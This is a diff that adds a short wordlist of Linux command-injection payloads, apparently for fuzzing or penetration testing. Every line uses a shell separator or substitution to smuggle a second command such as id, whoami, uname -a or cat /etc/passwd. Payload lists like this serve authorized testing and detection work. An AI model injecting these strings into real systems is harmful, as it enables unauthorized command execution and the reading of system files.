@@ -1,0 +1,22 @@
+# Command Injection - Linux Payloads
+; id
+& id
+| id
+`id`
+$(id)
+; whoami
+| whoami
+& whoami
+; cat /etc/passwd
+| cat /etc/passwd
+; uname -a
+| uname -a
+; ls -la
+; pwd
+; ifconfig
+; hostname
+$(cat /etc/passwd)
+;id;
+&id&
+|id|
+;ls;
